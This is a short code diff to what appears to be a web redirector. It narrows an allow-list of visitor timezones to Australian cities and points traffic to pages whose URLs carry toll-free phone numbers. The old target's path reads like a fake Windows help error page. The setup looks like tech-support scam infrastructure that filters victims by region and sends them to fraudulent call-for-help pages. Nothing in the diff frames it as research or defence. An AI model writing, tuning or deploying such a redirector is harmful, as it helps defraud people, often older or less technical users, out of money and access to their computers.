@@ -26,12 +26,13 @@ app.use((req, res, next) => {
 
 // O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
-    "Asia/Tokyo"
+    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin"
 ]);
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://nanandikply1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369", weight: 1.0 }
+    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 },
+    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 }
 
 ];
 
